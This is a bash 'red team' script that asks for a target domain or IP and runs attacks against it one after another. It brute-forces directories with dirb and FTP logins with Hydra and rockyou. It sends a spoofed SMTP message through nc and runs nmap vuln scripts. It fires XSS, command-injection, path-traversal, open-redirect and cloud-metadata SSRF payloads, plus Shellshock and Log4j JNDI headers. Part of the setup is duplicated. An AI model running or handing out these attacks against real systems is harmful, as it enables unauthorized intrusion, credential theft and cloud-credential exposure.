#!/bin/bash
clear
# Play background music if available
if command -v mpv >/dev/null 2>&1; then
  nohup mpv --no-video intro.mp3 > /dev/null 2>&1 &
elif command -v afplay >/dev/null 2>&1; then
  nohup afplay intro.mp3 > /dev/null 2>&1 &
else
  echo "🔇 Music player not found. Install mpv or afplay to enable sound."
fi

# Blinking Red ASCII Banner
echo -e "\e[31;5m"
cat << "EOF"
██████  ███████ ██████       ██   ██  █████  ██████  
██   ██ ██      ██   ██      ██   ██ ██   ██    ██  
██████  █████   ██████       ███████ ███████    ██  
██      ██      ██   ██      ██   ██ ██   ██    ██  
██      ███████ ██   ██ ██   ██   ██ ██   ██    ██  
        R E D   H A T    R E C O N N I N G   🐕      
-----------------------------------------------------
             🧠 Developed by: stackmorgan
         🛠️  Red Team Toolkit for Ethical Hackers
-----------------------------------------------------
📣 Join My Hacker's Community:
🟢 WhatsApp: https://whatsapp.com/channel/0029VbArnawB4hdTQZuJ9r3U
🔴 YouTube:  https://youtube.com/@mr_termux-r2l?si=Vqa9r39h7skjBIw7
-----------------------------------------------------
EOF
echo -e "\e[0m"

# Simulated Loading Effect
echo -ne "\n🔍 Initializing Engine"; sleep 0.5
for i in {1..12}; do
  echo -n "."; sleep 0.2
done
echo -e " ✅ Ready\n"

# Ask for target manually
read -p "Enter target domain or IP: " target
ip=$(dig +short $target | head -n1)
log="results.txt"
echo -e "📌 Target: $target ($ip)\n------------------------" | tee $log

# Now your full recon logic can continue below...
# ...
# Ask user for target
read -p "Enter target domain or IP: " target

ip=$(dig +short $target | head -n1)
log="results.txt"
js_fuzzer="js_fuzzer.js"

echo "Target: $target ($ip)" | tee $log
echo "Started at: $(date)" | tee -a $log
echo "----------------------------------------" | tee -a $log

# 1. TLS Version Scan
echo "[1] 🔐 TLS Support" | tee -a $log
for v in ssl2 ssl3 tls1 tls1_1 tls1_2 tls1_3; do
  echo -n " → $v: " | tee -a $log
  timeout 5 openssl s_client -$v -connect $target:443 < /dev/null 2>/dev/null | grep -q "Cipher is" && echo "✅ Supported" || echo "❌ Not supported"
done >> $log

# 2. HTTP Header Security
echo "[2] 🔍 HTTP Headers" | tee -a $log
curl -s -D - https://$target -o /dev/null | grep -Ei "Strict-Transport|Content-Security|X-Frame-Options|X-XSS|Referrer-Policy" >> $log

# 3. Dir Bruteforce
echo "[3] 📂 Directory Bruteforce (dirb)" | tee -a $log
dirb https://$target /usr/share/wordlists/dirb/common -o dirb.log
cat dirb.log >> $log

# 4. FTP Bruteforce
echo "[4] 🔓 FTP Brute-force (Hydra)" | tee -a $log
hydra -l admin -P /usr/share/wordlists/rockyou.txt ftp://$target -t 4 >> $log

# 5. JS Payload Fuzzing
echo "[5] 🧪 JS-based fuzzing (Headless Chrome)" | tee -a $log
if [ -f "$js_fuzzer" ]; then
  node $js_fuzzer "$target" >> $log
else
  echo " → JS fuzzer not found. Skipping..." | tee -a $log
fi

# 6. SMTP Spoof
echo "[6] ✉️ SMTP Spoof Check" | tee -a $log
(echo "EHLO test.local"; echo "MAIL FROM:<spoof@$target>"; echo "RCPT TO:<you@example.com>"; echo "QUIT") | nc $target 25 >> $log

# 7. CVE detection
echo "[7] 🛡️ CVE Banner Detection (Nmap)" | tee -a $log
nmap -sV --script vuln -Pn $target >> $log

# 8. Payload Injection
echo "[8] 💉 Payload Injection Tests" | tee -a $log
payloads=(
  "/?q=<script>alert(1)</script>"
  "/?cmd=whoami"
  "/?file=../../../../etc/passwd"
  "/redirect?url=http://evil.com"
  "/?url=http://169.254.169.254/latest/meta-data/"
)
for p in "${payloads[@]}"; do
  url="https://$target$p"
  echo " → $url" >> $log
  curl -s -k "$url" -o /dev/null -w "%{http_code}\n" >> $log
done

# 9. Reverse DNS and WHOIS
echo "[9] 🌐 WHOIS and rDNS" | tee -a $log
dig -x $ip +short >> $log
whois $ip | grep -Ei "netname|country|org|descr" >> $log

# 10. Header Exploit Markers
echo "[10] 🎯 Header-based Injection (Shellshock, Log4j, Host Poison)" | tee -a $log
curl -s -H 'User-Agent: () { :; }; echo; echo Exploited' \
     -H 'X-Api-Version: ${jndi:ldap://example.com/a}' \
     -H 'X-Forwarded-Host: evil.com' \
     https://$target >> $log

# 11. DNS Recon
echo "[11] 🔎 DNSRecon" | tee -a $log
dnsrecon -d $target -a -b -t std -j dnsrecon.json >> $log

echo "✅ Finished at: $(date)" | tee -a $log
echo "📁 Results saved to $log"
